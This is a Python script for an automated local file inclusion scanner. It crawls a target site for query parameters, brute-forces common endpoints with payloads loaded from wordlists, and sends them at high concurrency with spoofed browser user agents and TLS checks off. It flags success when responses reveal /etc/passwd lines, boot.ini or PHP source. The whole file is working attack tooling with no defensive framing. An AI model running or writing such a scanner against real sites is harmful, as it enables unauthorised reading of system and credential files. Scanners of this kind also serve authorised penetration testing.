import requests
import urllib3
import re
import sys
import os
import random
from urllib.parse import urlparse, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- SYSTEM SHIELD & NETWORKING CONFIG ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Full rotating pool of modern human browser signatures
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

common_params = ["filename", "file", "page", "template", "view", "lang", "path", "doc", "src", "img"]
common_endpoints = ["/image", "/show", "/view", "/download", "/img", "/static", "/get"]
confirmed = []

def print_bold_banner():
    CYAN = "\033[1;36m"
    GREEN = "\033[1;32m"
    RESET = "\033[0m"
    print(f"{CYAN}")
    print(" █████████   ███████████ ██████   ████████████████   ███████████ ███████████ ")
    print(" █▄▄▄▄▄▄▄█   █▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄█   █▄▄▄▄▄▄▄▄▄█ █▄▄▄▄▄▄▄▄▄█ ")
    print("   █████       █████       █████    █████              █████       █████     ")
    print("   █████       █████▄▄▄▄   █████    █████▄▄▄▄▄▄▄       █████▄▄▄▄   █████     ")
    print("   █████       █████▀▀▀▀   █████    █████▀▀▀▀▀▀▀       █████▀▀▀▀   █████     ")
    print("   █████       █████       █████    █████              █████       █████     ")
    print(" █████████   ███████     ████████ ████████         ███████████   ███████████ ")
    print(" █▄▄▄▄▄▄▄█   █▄▄▄▄▄█     █▄▄▄▄▄▄█ █▄▄▄▄▄▄█         █▄▄▄▄▄▄▄▄▄█   █▄▄▄▄▄▄▄▄▄█ ")
    print(f"{RESET}")
    print(f"               {GREEN}{{v4.0 #Stable - On-Demand Dictionary Engine}}{RESET}\n")

# --- RAW SOCKET OVERRIDE ---
class RawHTTPAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, raw_url, *args, **kwargs):
        self.raw_url = raw_url
        super().__init__(*args, **kwargs)
    def send(self, request, *args, **kwargs):
        request.url = self.raw_url
        return super().send(request, *args, **kwargs)

def check_sig(text):
    sigs = ["root:x:", "daemon:x:", "/bin/bash", "[boot loader]", "Configuration Script", "PD9waH"]
    return any(s in text for s in sigs)

def load_payload_file():
    print("\033[1;33m[?] Select Your Wordlist Depth:\033[0m")
    print(" [1] small-lfi.txt  (Fast - High Probability Vectors)")
    print(" [2] large-lfi.txt  (Deep Matrix - Structural Breaks & Obfuscations)")
    
    choice = input("\nChoose option (1 or 2): ").strip()
    # FIXED: Remapped variables to directly match your local workspace file structures
    filename = "small-lfi.txt" if choice == "1" else "large-lfi.txt"
    
    if not os.path.exists(filename):
        print(f"\n\033[1;31m[-] Error: File '{filename}' not found in current directory!\033[0m")
        sys.exit(1)
        
    print(f"\033[1;32m[+] Successfully loaded tracking matrix from: {filename}\033[0m")
    
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]

def verify(base, param, pay):
    try:
        raw_url = f"{base}?{param}={pay}"
        s = requests.Session()
        s.mount('https://', RawHTTPAdapter(raw_url))
        s.mount('http://', RawHTTPAdapter(raw_url))
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'close'
        }
        res = s.get(raw_url, headers=headers, timeout=4, verify=False, allow_redirects=False)
        
        if check_sig(res.text):
            print(f"\n\033[1;31m[+] VULNERABILITY CONFIRMED: {raw_url}\033[0m")
            confirmed.append(raw_url)
    except: pass

def get_targets(url):
    found = set()
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        r = requests.get(url, timeout=5, headers=headers, verify=False)
        matches = re.findall(r'(?:src|href|action)=["\'](.*?)\?([\w-]+)=', r.text)
        for path, param in matches:
            full_url = urljoin(url, path)
            found.add((full_url, param))
    except: pass
    return found

def main():
    print_bold_banner()
    
    # Dynamic Dictionary Selection Phase
    payload_pool = load_payload_file()
    
    target_url = input("\n\033[1;35mEnter Target URL: \033[0m").strip()
    if not target_url: return
    
    parsed = urlparse(target_url)
    domain_root = f"{parsed.scheme}://{parsed.netloc}"
    
    print("[*] Crawling page references for active endpoints...")
    discovered = get_targets(target_url)
    tasks = []

    # Strategy 1: Discovered Endpoints via Crawl
    for base, p_name in discovered:
        for p in payload_pool: tasks.append((base, p_name, p))
    
    # Strategy 2: Natively provided user string params
    if parsed.query:
        clean_base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for p_name in parse_qs(parsed.query):
            for p in payload_pool: tasks.append((clean_base, p_name, p))
    
    # Strategy 3: Dynamic Path Matrix Brute Force
    for ep in common_endpoints:
        full_ep = urljoin(domain_root, ep)
        for p_name in common_params:
            for p in payload_pool: tasks.append((full_ep, p_name, p))

    tasks = list(set(tasks))
    total_checks = len(tasks)
    print(f"[*] Dispatching {total_checks} targeted validation vectors across pool matrix...")

    # High Concurrency Execution Block
    with ThreadPoolExecutor(max_workers=45) as executor:
        futures = [executor.submit(verify, *t) for t in tasks]
        
        count = 0
        for _ in as_completed(futures):
            count += 1
            if count % 20 == 0 or count == total_checks:
                sys.stdout.write(f"\r\033[1;33m[*] Progress: {count}/{total_checks} iterations completed...\033[0m")
                sys.stdout.flush()

    print("\n" + "="*70)
    if confirmed:
        print(f"\033[1;32mSUCCESS! Found {len(set(confirmed))} Unique Vulnerability Links:\033[0m")
        for v in sorted(set(confirmed)):
            print(f" -> {v}")
    else:
        print("\033[1;31m[-] FAILED: Verification routine concluded with zero findings.\033[0m")
    print("="*70)

if __name__ == "__main__":
    main()
